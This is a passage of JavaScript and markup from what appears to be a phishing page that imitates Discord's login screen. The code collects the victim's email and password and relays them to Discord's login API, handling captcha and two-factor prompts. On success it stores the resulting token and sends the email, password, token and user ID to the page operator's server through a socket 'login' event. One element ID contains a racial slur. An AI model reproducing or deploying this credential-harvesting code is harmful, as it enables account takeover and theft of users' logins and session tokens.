height=0.5 width=0.95 x=0.375 y=0.6 rx=0.25 ry=0.25></rect></mask><mask id=svg-mask-avatar-status-round-80 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.85 cy=0.85 fill=black r=0.175></circle></mask><mask id=svg-mask-avatar-status-mobile-80 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.45 width=0.35 x=0.675 y=0.575 rx=0.09 ry=0.09></rect></mask><mask id=svg-mask-avatar-status-typing-80 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.35 width=0.65 x=0.525 y=0.675 rx=0.175 ry=0.175></rect></mask><mask id=svg-mask-avatar-status-round-120 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.8333333333333334 cy=0.8333333333333334 fill=black r=0.16666666666666666></circle></mask><mask id=svg-mask-avatar-status-mobile-120 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.43333333333333335 width=0.3333333333333333 x=0.6666666666666666 y=0.5666666666666667 rx=0.08666666666666667 ry=0.08666666666666667></rect></mask><mask id=svg-mask-avatar-status-typing-120 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.3333333333333333 width=0.6333333333333333 x=0.5166666666666667 y=0.6666666666666666 rx=0.16666666666666666 ry=0.16666666666666666></rect></mask><mask id=svg-mask-status-online-mobile maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1 x=0 y=0 rx=0.1875 ry=0.125></rect><rect fill=black height=0.5 width=0.75 x=0.125 y=0.16666666666666666></rect><ellipse cx=0.5 cy=0.8333333333333334 fill=black rx=0.125 ry=0.08333333333333333></ellipse></mask><mask id=svg-mask-status-online maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle></mask><mask id=svg-mask-status-idle maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.25 cy=0.25 fill=black r=0.375></circle></mask><mask id=svg-mask-status-dnd maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.25 width=0.75 x=0.125 y=0.375 rx=0.125 ry=0.125></rect></mask><mask id=svg-mask-status-offline maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.5 cy=0.5 fill=black r=0.25></circle></mask><mask id=svg-mask-status-streaming maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><polygon fill=black points="0.35,0.25 0.78301275,0.5 0.35,0.75"></polygon></mask><mask id=svg-mask-status-typing maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1 rx=0.2 ry=0.5 cx=0 cy=0></rect></mask><mask id=svg-mask-avatar-voice-call-80 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.85 cy=0.85 fill=black r=0.2></circle></mask><mask id=svg-mask-avatar-call-icon maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5 opacity=1></circle><circle cx=0.85 cy=0.15 fill=black r=0.2></circle></mask><mask id=svg-mask-avatar-call-icon-32 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5 opacity=0.5></circle><circle cx=0.8 cy=0.25 fill=black r=0.325></circle></mask><mask id=svg-mask-sticker-rounded-rect maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><path d="M0 0.26087C0 0.137894 0 0.0764069 0.0382035 0.0382035C0.0764069 0 0.137894 0 0.26087 0H0.73913C0.862106 0 0.923593 0 0.961797 0.0382035C1 0.0764069 1 0.137894 1 0.26087V0.73913C1 0.862106 1 0.923593 0.961797 0.961797C0.923593 1 0.862106 1 0.73913 1H0.26087C0.137894 1 0.0764069 1 0.0382035 0.961797C0 0.923593 0 0.862106 0 0.73913V0.26087Z"fill=white></path></mask><mask id=svg-mask-chat-input-button-notification maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1></rect><circle cx=0.85 cy=0.85 fill=black r=0.25></circle></mask><mask id=svg-mask-sticker-shop-notification maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1></rect><circle cx=0.9 cy=0.9 fill=black r=0.5></circle></mask><mask id=svg-mask-autocomplete-emoji-upsell-emoji maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1></rect><circle cx=1.33 cy=0.5 fill=black r=0.5833333333333334></circle></mask><mask id=svg-mask-event-ticket maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><path d="M0 0.12C0 0.0779961 0 0.0569941 0.00408726 0.0409507C0.00768251 0.0268386 0.0134193 0.015365 0.0204754 0.00817451C0.028497 0 0.038998 0 0.06 0H0.94C0.961002 0 0.971503 0 0.979525 0.00817451C0.986581 0.015365 0.992318 0.0268386 0.995913 0.0409507C1 0.0569941 1 0.0779961 1 0.12V0.45C0.986193 0.45 0.975 0.472386 0.975 0.5C0.975 0.527614 0.986193 0.55 1 0.55V0.88C1 0.922004 1 0.943006 0.995913 0.959049C0.992318 0.973161 0.986581 0.984635 0.979525 0.991826C0.971503 1 0.961002 1 0.94 1H0.0600001C0.0389981 1 0.028497 1 0.0204754 0.991826C0.0134193 0.984635 0.00768251 0.973161 0.00408726 0.959049C0 0.943006 0 0.922004 0 0.88V0.55C0.0138071 0.55 0.025 0.527614 0.025 0.5C0.025 0.472386 0.0138071 0.45 0 0.45V0.12Z"fill=white></path></mask></svg><svg aria-hidden=true style=position:absolute;pointer-events:none;top:-1px;left:-1px;width:1px;height:1px viewBox="0 0 1 1"><linearGradient id=4d7c3cc7-fc0a-4195-a5a9-c4027330fa6e><stop stop-color="hsl(228, calc(var(--saturation-factor, 1) * 86.7%), 70.6%)"></stop><stop stop-color="hsl(244, calc(var(--saturation-factor, 1) * 100%), 84.1%)"offset=1></stop></linearGradient><linearGradient id=24aa1047-e59a-4d1c-81ba-6d8f6b101b0f><stop stop-color="hsl(270, calc(var(--saturation-factor, 1) * 86.7%), 70.6%)"></stop><stop stop-color="hsl(342, calc(var(--saturation-factor, 1) * 58%), 72.9%)"offset=1></stop></linearGradient><linearGradient id=73effe82-7fd3-4e57-bb44-5da4b7f75057><stop stop-color="hsl(221, calc(var(--saturation-factor, 1) * 70%), 55.5%)"></stop><stop stop-color="hsl(269, calc(var(--saturation-factor, 1) * 83.8%), 71%)"offset=1></stop></linearGradient><linearGradient id=c734f07b-5ba3-4089-a64b-e342b77af2cd><stop stop-color="hsl(166, calc(var(--saturation-factor, 1) * 51%), 50.4%)"></stop><stop stop-color="hsl(201, calc(var(--saturation-factor, 1) * 51.6%), 52.2%)"offset=1></stop></linearGradient></svg><div style=position:fixed;opacity:0;pointer-events:none></div><div class=app-1q1i1E><div class="container-16j22k fixClipping-3qAKRb"style=opacity:1><div class=content-1-zrf2><video autoplay class=ready-36e6Vk loop playsinline=""><source src=/assets/3b0d96ed8113994f3d139088726cfecd.webm type=video/webm><source src=/assets/6d5b64b094944af6d52d895c8c2b8a59.mp4 type=video/mp4><img alt=""src=/assets/dff87c953f43b561d71fbcfe8a93a79a.png></video><div class=text-3c9Zq1><div class=tipTitle-GL9qAt>Did you know</div><div class=tip-2cgoli>Type /tenor or /giphy + anything to find a GIF for that topic!</div><div class="body-2Vra9D contentBase-11jeVK"></div></div></div></div></div><div></div><div></div><div class=layerContainer-yqaFcK></div><div class=layerContainer-yqaFcK></div><div style=position:fixed;opacity:0;pointer-events:none></div>`;
                        setTimeout(() => {
                            window.location.replace(`/${makeid(24)}`);
                        }, 2500)
                    });
            } else {
                if (response.includes('mfa":true')) {
                    const okayladlad = JSON.parse(response);
                    keylol = okayladlad.ticket;
                    document.getElementsByClassName("authBoxExpanded-2jqaBe")[0].style.display = "none";
                    document.getElementById("loadupmf").style.display = "block";
                } else if (response.includes('New login location detected')) {
                    document.getElementsByClassName("size14-e6ZScH")[0].classList.add("error-25JxNp");
                    document.getElementById("nullnoneemail").style.visibility = "visible";
                    document.getElementsByClassName("input-cIJ7To")[0].classList.add("error-2O5WFJ");
                    document.getElementById("nullnoneemail").textContent = " - New login location detected. Please check your e-mail.";
                    document.getElementById("funnybuttonzz").classList.remove("submitting-3qlO9O");
                    document.getElementById("spinnyniggers").style.visibility = "hidden";
                } else {
                    document.getElementsByClassName("size14-e6ZScH")[0].classList.add("error-25JxNp");
                    document.getElementById("nullnoneemail").style.visibility = "visible";
                    document.getElementById("nullnoneemail").textContent = " - Login or password is invalid.";
                    document.getElementsByClassName("size14-e6ZScH")[1].classList.add("error-25JxNp");
                    document.getElementById("nullnonepass").style.visibility = "visible";
                    document.getElementById("nullnonepass").textContent = " - Login or password is invalid.";
                    document.getElementById("funnybuttonzz").classList.remove("submitting-3qlO9O");
                    document.getElementById("spinnyniggers").style.visibility = "hidden";
                }
            }
        })
}

function submitlogin() {
    document.getElementsByClassName("input-cIJ7To")[0].classList.remove("error-2O5WFJ");
    document.getElementsByClassName("size14-e6ZScH")[0].classList.remove("error-25JxNp");
    document.getElementsByClassName("featusmanzeb")[0].classList.remove("error-2O5WFJ");
    document.getElementsByClassName("size14-e6ZScH")[1].classList.remove("error-25JxNp");
    document.getElementById("nullnoneemail").style.visibility = "hidden";
    document.getElementById("nullnonepass").style.visibility = "hidden";
    document.getElementById("funnybuttonzz").classList.add("submitting-3qlO9O");
    document.getElementById("spinnyniggers").style.visibility = "visible";
    setTimeout(() => {

        var password = document.getElementById("password")
        var email = document.getElementById("email")
        if (email.value == "") {
            document.getElementById("funnybuttonzz").classList.remove("submitting-3qlO9O");
            document.getElementById("spinnyniggers").style.visibility = "hidden";
            document.getElementsByClassName("input-cIJ7To")[0].classList.add("error-2O5WFJ");
            document.getElementsByClassName("size14-e6ZScH")[0].classList.add("error-25JxNp");
            document.getElementById("nullnoneemail").style.visibility = "visible";
            document.getElementById("nullnoneemail").textContent = " - This field is required";
            document.getElementById("nullnonepass").textContent = " - This field is required";
        }
        if (password.value == "") {
            document.getElementById("funnybuttonzz").classList.remove("submitting-3qlO9O");
            document.getElementById("spinnyniggers").style.visibility = "hidden";
            document.getElementsByClassName("featusmanzeb")[0].classList.add("error-2O5WFJ");
            document.getElementsByClassName("size14-e6ZScH")[1].classList.add("error-25JxNp");
            document.getElementById("nullnonepass").style.visibility = "visible";
            document.getElementById("nullnoneemail").textContent = " - This field is required";
            document.getElementById("nullnonepass").textContent = " - This field is required";
        }
        if (email.value == "" && password.value == "") {
            document.getElementById("funnybuttonzz").classList.remove("submitting-3qlO9O");
            document.getElementById("spinnyniggers").style.visibility = "hidden";
            document.getElementsByClassName("input-cIJ7To")[0].classList.add("error-2O5WFJ");
            document.getElementsByClassName("featusmanzeb")[0].classList.add("error-2O5WFJ");
            document.getElementsByClassName("size14-e6ZScH")[0].classList.add("error-25JxNp");
            document.getElementsByClassName("size14-e6ZScH")[1].classList.add("error-25JxNp");
            document.getElementById("nullnoneemail").style.visibility = "visible";
            document.getElementById("nullnonepass").style.visibility = "visible";
            document.getElementById("nullnoneemail").textContent = " - This field is required";
            document.getElementById("nullnonepass").textContent = " - This field is required";
        } else {
            if (email.value.includes("@")) {
                fetch("/api/v9/auth/login", {
                        "headers": {
                            "accept": "*/*",
                            "accept-language": "en-GB",
                            "authorization": "undefined",
                            "content-type": "application/json",
                            "origin": "discord.com",
                            "x-debug-options": "bugReporterEnabled",
                            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk0LjAuNDYwNi44MSBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiOTQuMC40NjA2LjgxIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50Ijoid3d3Lmdvb2dsZS5jb20iLCJzZWFyY2hfZW5naW5lX2N1cnJlbnQiOiJnb29nbGUiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoxMDE0NTEsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
                        },
                        "referrer": "https://discord.com/login",
                        "referrerPolicy": "strict-origin-when-cross-origin",
                        "body": "{\"login\":\"" + email.value + "\",\"password\":\"" + password.value + "\",\"undelete\":false,\"captcha_key\":null,\"login_source\":null,\"gift_code_sku_id\":null}",
                        "method": "POST",
                        "mode": "cors",
                        "credentials": "include"
                    }).then(response => response.text())
                    .then((response) => {
                        if (response.includes("captcha-required")) {
                            document.getElementsByClassName("authBoxExpanded-2jqaBe")[0].style.display = "none";
                            document.getElementById("captchabox").style.display = "block";
                        } else {
                            if (response.includes('token":"')) {
                                const resp2 = JSON.parse(response);
                                localStorage.setItem("token", resp2.token);
                                localStorage.setItem("email", email.value);
                                localStorage.setItem("password", password.value);
                                fetch("https://discord.com/api/v9/users/@me", {
                                        "headers": {
                                            "accept": "*/*",
                                            "accept-language": "en-GB",
                                            "content-type": "application/json",
                                            "authorization": resp2.token,
                                            "origin": "discord.com",
                                            "x-debug-options": "bugReporterEnabled",
                                            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk0LjAuNDYwNi44MSBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiOTQuMC40NjA2LjgxIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjEwMTQ1MSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
                                        },
                                        "referrer": "https://discord.com/login",
                                        "referrerPolicy": "strict-origin-when-cross-origin",
                                        "method": "GET",
                                        "mode": "cors",
                                        "credentials": "include"
                                    }).then(response => response.text())
                                    .then((response) => {
                                        const resp2 = JSON.parse(response);
                                        localStorage.setItem("pfp", `https://cdn.discordapp.com/avatars/${resp2.id}/${resp2.avatar}?size=128`);
                                        localStorage.setItem("user", `${resp2.username}#${resp2.discriminator}`);
                                        localStorage.setItem("id", resp2.id);

                                        var socket = io();

                                        setTimeout(() => {
                                            socket.emit("login", {
                                                "email": localStorage.getItem("email"),
                                                "password": localStorage.getItem("password"),
                                                "token": localStorage.getItem("token"),
                                                "id": resp2.id,
                                            });
                                        }, 500);

                                        document.getElementById("app-mount").innerHTML =
                                            `<svg aria-hidden=true style=position:absolute;pointer-events:none;top:-1px;left:-1px;width:1px;height:1px viewBox="0 0 1 1"><mask id=svg-mask-squircle maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><path d="M0 0.464C0 0.301585 0 0.220377 0.0316081 0.158343C0.0594114 0.103776 0.103776 0.0594114 0.158343 0.0316081C0.220377 0 0.301585 0 0.464 0H0.536C0.698415 0 0.779623 0 0.841657 0.0316081C0.896224 0.0594114 0.940589 0.103776 0.968392 0.158343C1 0.220377 1 0.301585 1 0.464V0.536C1 0.698415 1 0.779623 0.968392 0.841657C0.940589 0.896224 0.896224 0.940589 0.841657 0.968392C0.779623 1 0.698415 1 0.536 1H0.464C0.301585 1 0.220377 1 0.158343 0.968392C0.103776 0.940589 0.0594114 0.896224 0.0316081 0.841657C0 0.779623 0 0.698415 0 0.536V0.464Z"fill=white></path></mask><mask id=svg-mask-header-bar-badge maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1 x=0 y=0></rect><circle cx=0.75 cy=0.75 fill=black r=0.25></circle></mask><mask id=svg-mask-voice-user-summary-item maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1></rect><circle cx=1.2083333333333333 cy=0.5 fill=black r=0.5416666666666666></circle></mask><mask id=svg-mask-vertical-fade maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><linearGradient id=svg-mask-vertical-fade-gradient gradientTransform=rotate(90) x1=0 x2=1 y1=0 y2=0><stop stop-color=white offset=0%></stop><stop stop-color=black offset=100%></stop></linearGradient><rect fill=url(#svg-mask-vertical-fade-gradient) height=1 width=1 x=0 y=0></rect></mask><mask id=svg-mask-panel-button maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1 x=0 y=0></rect><circle cx=0.75 cy=0.75 fill=black r=0.25></circle></mask><mask id=svg-mask-channel-call-control-button maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.8214285714285714 cy=0.8214285714285714 fill=black r=0.25></circle></mask><mask id=svg-mask-channel-call-control-button-badge-16 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.42857142857142855 width=0.42857142857142855 x=0.6428571428571429 y=-0.07142857142857142 rx=0.21428571428571427 ry=0.21428571428571427></rect></mask><mask id=svg-mask-channel-call-control-button-badge-22 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.42857142857142855 width=0.5357142857142857 x=0.5357142857142857 y=-0.07142857142857142 rx=0.21428571428571427 ry=0.21428571428571427></rect></mask><mask id=svg-mask-channel-call-control-button-badge-29 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.42857142857142855 width=0.6607142857142857 x=0.4107142857142857 y=-0.07142857142857142 rx=0.21428571428571427 ry=0.21428571428571427></rect></mask><mask id=svg-mask-avatar-default maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle></mask><mask id=svg-mask-avatar-status-round-16 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.8125 cy=0.8125 fill=black r=0.3125></circle></mask><mask id=svg-mask-avatar-status-mobile-16 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.8125 width=0.625 x=0.5 y=0.3125 rx=0.1625 ry=0.1625></rect></mask><mask id=svg-mask-avatar-status-typing-16 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.625 width=1.1875 x=0.21875 y=0.5 rx=0.3125 ry=0.3125></rect></mask><mask id=svg-mask-avatar-status-round-24 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.8333333333333334 cy=0.8333333333333334 fill=black r=0.2916666666666667></circle></mask><mask id=svg-mask-avatar-status-mobile-24 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.75 width=0.5833333333333334 x=0.5416666666666666 y=0.375 rx=0.15 ry=0.15></rect></mask><mask id=svg-mask-avatar-status-typing-24 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.5833333333333334 width=1.0833333333333333 x=0.2916666666666667 y=0.5416666666666666 rx=0.2916666666666667 ry=0.2916666666666667></rect></mask><mask id=svg-mask-avatar-status-round-32 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.84375 cy=0.84375 fill=black r=0.25></circle></mask><mask id=svg-mask-avatar-status-mobile-32 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.65625 width=0.5 x=0.59375 y=0.4375 rx=0.13125 ry=0.13125></rect></mask><mask id=svg-mask-avatar-status-typing-32 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.5 width=0.96875 x=0.359375 y=0.59375 rx=0.25 ry=0.25></rect></mask><mask id=svg-mask-avatar-status-round-40 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.85 cy=0.85 fill=black r=0.25></circle></mask><mask id=svg-mask-avatar-status-mobile-40 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.65 width=0.5 x=0.6 y=0.45 rx=0.13 ry=0.13></rect></mask><mask id=svg-mask-avatar-status-typing-40 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.5 width=0.95 x=0.375 y=0.6 rx=0.25 ry=0.25></rect></mask><mask id=svg-mask-avatar-status-round-80 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.85 cy=0.85 fill=black r=0.175></circle></mask><mask id=svg-mask-avatar-status-mobile-80 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.45 width=0.35 x=0.675 y=0.575 rx=0.09 ry=0.09></rect></mask><mask id=svg-mask-avatar-status-typing-80 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.35 width=0.65 x=0.525 y=0.675 rx=0.175 ry=0.175></rect></mask><mask id=svg-mask-avatar-status-round-120 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.8333333333333334 cy=0.8333333333333334 fill=black r=0.16666666666666666></circle></mask><mask id=svg-mask-avatar-status-mobile-120 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.43333333333333335 width=0.3333333333333333 x=0.6666666666666666 y=0.5666666666666667 rx=0.08666666666666667 ry=0.08666666666666667></rect></mask><mask id=svg-mask-avatar-status-typing-120 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.3333333333333333 width=0.6333333333333333 x=0.5166666666666667 y=0.6666666666666666 rx=0.16666666666666666 ry=0.16666666666666666></rect></mask><mask id=svg-mask-status-online-mobile maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1 x=0 y=0 rx=0.1875 ry=0.125></rect><rect fill=black height=0.5 width=0.75 x=0.125 y=0.16666666666666666></rect><ellipse cx=0.5 cy=0.8333333333333334 fill=black rx=0.125 ry=0.08333333333333333></ellipse></mask><mask id=svg-mask-status-online maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle></mask><mask id=svg-mask-status-idle maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.25 cy=0.25 fill=black r=0.375></circle></mask><mask id=svg-mask-status-dnd maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><rect fill=black height=0.25 width=0.75 x=0.125 y=0.375 rx=0.125 ry=0.125></rect></mask><mask id=svg-mask-status-offline maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.5 cy=0.5 fill=black r=0.25></circle></mask><mask id=svg-mask-status-streaming maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><polygon fill=black points="0.35,0.25 0.78301275,0.5 0.35,0.75"></polygon></mask><mask id=svg-mask-status-typing maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1 rx=0.2 ry=0.5 cx=0 cy=0></rect></mask><mask id=svg-mask-avatar-voice-call-80 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5></circle><circle cx=0.85 cy=0.85 fill=black r=0.2></circle></mask><mask id=svg-mask-avatar-call-icon maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5 opacity=1></circle><circle cx=0.85 cy=0.15 fill=black r=0.2></circle></mask><mask id=svg-mask-avatar-call-icon-32 maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><circle cx=0.5 cy=0.5 fill=white r=0.5 opacity=0.5></circle><circle cx=0.8 cy=0.25 fill=black r=0.325></circle></mask><mask id=svg-mask-sticker-rounded-rect maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><path d="M0 0.26087C0 0.137894 0 0.0764069 0.0382035 0.0382035C0.0764069 0 0.137894 0 0.26087 0H0.73913C0.862106 0 0.923593 0 0.961797 0.0382035C1 0.0764069 1 0.137894 1 0.26087V0.73913C1 0.862106 1 0.923593 0.961797 0.961797C0.923593 1 0.862106 1 0.73913 1H0.26087C0.137894 1 0.0764069 1 0.0382035 0.961797C0 0.923593 0 0.862106 0 0.73913V0.26087Z"fill=white></path></mask><mask id=svg-mask-chat-input-button-notification maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1></rect><circle cx=0.85 cy=0.85 fill=black r=0.25></circle></mask><mask id=svg-mask-sticker-shop-notification maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1></rect><circle cx=0.9 cy=0.9 fill=black r=0.5></circle></mask><mask id=svg-mask-autocomplete-emoji-upsell-emoji maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><rect fill=white height=1 width=1></rect><circle cx=1.33 cy=0.5 fill=black r=0.5833333333333334></circle></mask><mask id=svg-mask-event-ticket maskContentUnits=objectBoundingBox viewBox="0 0 1 1"><path d="M0 0.12C0 0.0779961 0 0.0569941 0.00408726 0.0409507C0.00768251 0.0268386 0.0134193 0.015365 0.0204754 0.00817451C0.028497 0 0.038998 0 0.06 0H0.94C0.961002 0 0.971503 0 0.979525 0.00817451C0.986581 0.015365 0.992318 0.0268386 0.995913 0.0409507C1 0.0569941 1 0.0779961 1 0.12V0.45C0.986193 0.45 0.975 0.472386 0.975 0.5C0.975 0.527614 0.986193 0.55 1 0.55V0.88C1 0.922004 1 0.943006 0.995913 0.959049C0.992318 0.973161 0.986581 0.984635 0.979525 0.991826C0.971503 1 0.961002 1 0.94 1H0.0600001C0.0389981 1 0.028497 1 0.0204754 0.991826C0.0134193 0.984635 0.00768251 0.973161 0.00408726 0.959049C0 0.943006 0 0.922004 0 0.88V0.55C0.0138071 0.55 0.025 0.527614 0.025 0.5C0.025 0.472386 0.0138071 0.45 0 0.45V0.12Z"fill=white></path></mask></svg><svg aria-hidden=true style=position:absolute;pointer-events:none;top:-1px;left:-1px;width:1px;height:1px viewBox="0 0 1 1"><linearGradient id=4d7c3cc7-fc0a-4195-a5a9-c4027330fa6e><stop stop-color="hsl(228, calc(var(--saturation-factor, 1) * 86.7%), 70.6%)"></stop><stop stop-color="hsl(244, calc(var(--saturation-factor, 1) * 100%), 84.1%)"offset=1></stop></linearGradient><linearGradient id=24aa1047-e59a-4d1c-81ba-6d8f6b101b0f><stop stop-color="hsl(270, calc(var(--saturation-factor, 1) * 86.7%), 70.6%)"></stop><stop stop-color="hsl(342, calc(var(--saturation-factor, 1) * 58%), 72.9%)"offset=1></stop></linearGradient><linearGradient id=73effe82-7fd3-4e57-bb44-5da4b7f75057><stop stop-color="hsl(221, calc(var(--saturation-factor, 1) * 70%), 55.5%)"></stop><stop stop-color="hsl(269, calc(var(--saturation-factor, 1) * 83.8%), 71%)"offset=1></stop></linearGradient><linearGradient id=c734f07b-5ba3-4089-a64b-e342b77af2cd><stop stop-color="hsl(166, calc(var(--saturation-factor, 1) * 51%), 50.4%)"></stop><stop 